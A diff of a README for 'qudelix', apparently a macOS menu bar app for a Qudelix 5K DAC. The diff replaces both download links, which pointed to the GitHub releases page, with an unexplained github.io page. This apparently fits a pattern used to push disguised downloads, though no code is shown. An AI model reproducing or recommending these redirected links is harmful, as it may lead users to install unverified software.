@@ -1,6 +1,6 @@
 # 🎵 qudelix - Control Your Qudelix 5K DAC from Your Mac Menu Bar
 
-[![Download Now](https://img.shields.io/badge/Download%20qudelix-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/flashinthepansungdynasty322/qudelix/releases)
+[![Download Now](https://img.shields.io/badge/Download%20qudelix-v1.0-blue?style=for-the-badge&logo=github)](https://flashinthepansungdynasty322.github.io)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ Welcome to qudelix, the native macOS menu bar app that gives you complete contro
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/flashinthepansungdynasty322/qudelix/releases](https://github.com/flashinthepansungdynasty322/qudelix/releases)
+Visit this link to download the application: [https://flashinthepansungdynasty322.github.io](https://flashinthepansungdynasty322.github.io)
 
 Once downloaded, double-click the file to open it. Drag the qudelix app to your Applications folder. When you first open it, macOS may ask for permission to access the USB devices. Click "Allow" to enable full functionality.
 
